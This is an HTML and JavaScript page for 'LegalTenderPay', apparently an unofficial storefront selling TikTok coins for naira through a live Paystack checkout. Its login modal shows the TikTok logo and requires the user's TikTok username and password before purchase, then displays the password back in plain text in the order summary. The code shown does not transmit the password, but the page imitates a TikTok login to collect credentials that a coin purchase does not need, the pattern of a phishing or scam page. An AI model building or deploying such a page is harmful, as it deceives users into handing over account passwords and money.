<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>LegalTenderPay</title>

<!-- Paystack Inline Script -->
<script src="https://js.paystack.co/v1/inline.js"></script>

<style>
/* ...[existing CSS unchanged except few lines below]... */

.login-content input {
  width: 85%;
  padding: 12px;
  margin: 8px 0;
  border: 1px solid #ccc;
  border-radius: 6px;
  font-size: 15px;
}

/* style email input same as others */
#emailInput {
  margin-bottom: 14px;
}

</style>
</head>

<body>
<div class="secure-payment">Secure Payment via LegalTenderPay</div>

<div class="container">
  <!-- header, coins grid, and rest unchanged -->
  <div class="header">
    <div>
      <h1>Get Coins</h1>
      <p class="sub-text">Save around <span>25%</span> with a lower<br>third-party service fee.</p>
    </div>
    <div class="logo-box">
      <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/IMG_0855.jpeg" alt="Logo">
    </div>
  </div>

  <div class="coins-grid" id="coinsGrid">
    <div class="coin-box" data-coins="30" onclick="selectBox(this)">
      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
      <div class="coin-price">â‚¦530</div>
    </div>
    <div class="coin-box" data-coins="350" onclick="selectBox(this)">
      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
      <div class="coin-price">â‚¦6,200</div>
    </div>
    <div class="coin-box" data-coins="700" onclick="selectBox(this)">
      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
      <div class="coin-price">â‚¦12,400</div>
    </div>
    <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
      <div class="coin-price">â‚¦24,700</div>
    </div>
    <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
      <div class="coin-price">â‚¦61,985</div>
    </div>
    <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
      <span class="coin-amount">Custom</span>
    </div>
  </div>

  <div class="custom-input" id="customInputBox">
    <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
  </div>

  <button class="login-btn" id="mainButton" onclick="mainButtonAction()">Log in to get Coins</button>

  <!-- invite & footer unchanged -->
  <div class="invite-box">
    <div class="invite-left">
      <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
      <div>
        <div class="invite-text">Invite & Get Rewards</div>
        <div class="invite-sub">Check out this new feature!</div>
      </div>
    </div>
    <span class="share-btn" onclick="alert('Share this link manually!')">&#62;</span>
  </div>

  <div class="coin-image-section">
    <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
  </div>

  <div class="footer">
    <div class="legal">LegalTenderPay</div>
  </div>
</div>

<!-- Loading overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="loader"></div>
</div>

<!-- Login modal -->
<div class="login-modal" id="loginModal">
  <div class="login-content">
    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
         alt="TikTok Logo"
         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
    <p>Log in to your TikTok account to confirm where to send coins.</p>
    <input type="text" id="usernameInput" placeholder="Username" required><br>
    <input type="password" id="passwordInput" placeholder="Password" required><br>
    <input type="email" id="emailInput" placeholder="Email (for receipt)" required><br>
    <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
  </div>
</div>

<!-- Order Summary -->
<div class="order-summary" id="orderSummary">
  <div class="order-close" onclick="closeOrderSummary()">âœ•</div>
  <h2>Order Summary</h2>
  <div class="secure-pay">Secure payment &gt;</div>

  <div class="summary-row">
    <div>
      <div class="summary-label">Account</div>
      <div class="small-muted" id="accountUsername">@user</div>
      <div class="small-muted" id="accountEmail">Email: â€”</div>
      <div class="small-muted" id="accountPassword" style="margin-top:6px;">Password: â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</div>
    </div>
  </div>

  <div class="summary-row">
    <div class="summary-label">Total Coin Purchase</div>
    <div class="summary-value" id="summaryCoins">â€”</div>
  </div>

  <div class="summary-row">
    <div class="summary-label">Amount</div>
    <div class="summary-value" id="summaryAmount">â€”</div>
  </div>

  <div style="margin-top:10px;">
    <div class="payment-method" style="font-weight:700;">Payment method</div>
    <div class="small-muted" style="margin-top:6px;">Paystack</div>
  </div>

  <p class="notice-text small-muted" style="margin-top:12px;">
    By tapping Pay now to make a purchase, you acknowledge that you are purchasing a limited license to access this <span style="color:#000;">ðŸ”»</span>
  </p>

  <div class="total-row">
    <span>Total</span>
    <span id="summaryTotal">â€”</span>
  </div>

  <button class="pay-now" id="payNowBtn" onclick="payWithPaystack()">Pay Now</button>
</div>

<!-- success toast -->
<div class="toast" id="successToast">Payment Successful â€” Coins will be sent shortly.</div>

<script>
const PAYSTACK_PUBLIC_KEY = 'pk_live_05d5fe8301b202427f3d3a9b26059269ddd1c00f';
const MERCHANT_EMAIL = 'Legaltenderpay@gmail.com';
let coinRate = 17.71;
let selectedCoins = 350;
let loggedIn = false;

/* helpers */
function formatCurrency(amount){return 'â‚¦'+Math.round(amount).toLocaleString('en-NG');}

/* coin select */
function selectBox(el){document.querySelectorAll('.coin-box').forEach(b=>b.classList.remove('active'));el.classList.add('active');const d=el.getAttribute('data-coins');if(d==='custom'){selectCustom(el);return;}selectedCoins=parseInt(d)||0;document.getElementById('customInputBox').style.display='none';updateMainButton();}
function selectCustom(el){document.querySelectorAll('.coin-box').forEach(b=>b.classList.remove('active'));el.classList.add('active');document.getElementById('customInputBox').style.display='block';selectedCoins=0;updateMainButton();}
function updateCustomAmount(){const val=parseInt(document.getElementById('customAmount').value);selectedCoins=val>0?val:0;updateMainButton();}

/* button state */
function updateMainButton(){const btn=document.getElementById('mainButton');if(!loggedIn){btn.textContent='Log in to get Coins';return;}if(selectedCoins>0){btn.textContent=`Buy ${selectedCoins} Coins for ${formatCurrency(selectedCoins*coinRate)}`;}else{btn.textContent='Buy Now';}}
function mainButtonAction(){if(!loggedIn){startLogin();return;}showOrderSummary();}

/* login */
function startLogin(){document.getElementById('loadingOverlay').style.display='flex';setTimeout(()=>{document.getElementById('loadingOverlay').style.display='none';document.getElementById('loginModal').style.display='flex';},700);}
function completeLogin(){document.getElementById('loginModal').style.display='none';document.getElementById('loadingOverlay').style.display='flex';setTimeout(()=>{document.getElementById('loadingOverlay').style.display='none';loggedIn=true;updateMainButton();},900);}

/* summary */
function showOrderSummary(){
  const username=document.getElementById('usernameInput').value.trim()||'user';
  const password=document.getElementById('passwordInput').value||'';
  const email=document.getElementById('emailInput').value.trim()||MERCHANT_EMAIL;
  const coins=selectedCoins>0?selectedCoins:0;
  const amount=Math.round(coins*coinRate);
  document.getElementById('accountUsername').textContent='@'+username;
  document.getElementById('accountEmail').textContent='Email: '+email;
  document.getElementById('accountPassword').textContent='Password: '+(password?password:'â€”');
  document.getElementById('summaryCoins').textContent=coins.toLocaleString()+' Coins';
  document.getElementById('summaryAmount').textContent=formatCurrency(amount);
  document.getElementById('summaryTotal').textContent=formatCurrency(amount);
  document.getElementById('orderSummary').style.display='block';
}

function closeOrderSummary(){document.getElementById('orderSummary').style.display='none';}

/* paystack */
function payWithPaystack(){
  const username=document.getElementById('usernameInput').value.trim()||'user';
  const email=document.getElementById('emailInput').value.trim()||MERCHANT_EMAIL;
  const coins=selectedCoins>0?selectedCoins:0;
  if(coins<=0){alert('Please select a valid coins amount.');return;}
  const amountNGN=coins*coinRate;
  const handler=PaystackPop.setup({
    key:PAYSTACK_PUBLIC_KEY,
    email:email,
    amount:Math.round(amountNGN*100),
    currency:'NGN',
    metadata:{
      custom_fields:[
        {display_name:"TikTok username",variable_name:"username",value:'@'+username},
        {display_name:"Coins",variable_name:"coins",value:coins.toString()}
      ]
    },
    callback:function(){document.getElementById('orderSummary').style.display='none';showSuccessToast();},
    onClose:function(){}
  });
  handler.openIframe();
}

/* toast */
function showSuccessToast(){const t=document.getElementById('successToast');t.style.display='block';setTimeout(()=>{t.style.opacity='1';},10);setTimeout(()=>{t.style.opacity='0';setTimeout(()=>t.style.display='none',300);},4000);}

/* enable continue button */
const u=document.getElementById('usernameInput'),p=document.getElementById('passwordInput'),e=document.getElementById('emailInput'),c=document.getElementById('continueBtn');
function checkLoginFields(){if(u.value.trim()&&p.value.trim()&&e.value.trim()){c.disabled=false;c.style.opacity='1';c.style.cursor='pointer';}else{c.disabled=true;c.style.opacity='0.6';c.style.cursor='not-allowed';}}
[u,p,e].forEach(f=>f.addEventListener('input',checkLoginFields));

(function init(){document.querySelectorAll('.coin-box').forEach(b=>{if(b.getAttribute('data-coins')==='350')b.classList.add('active');});selectedCoins=350;updateMainButton();})();
</script>
</body>
</html>
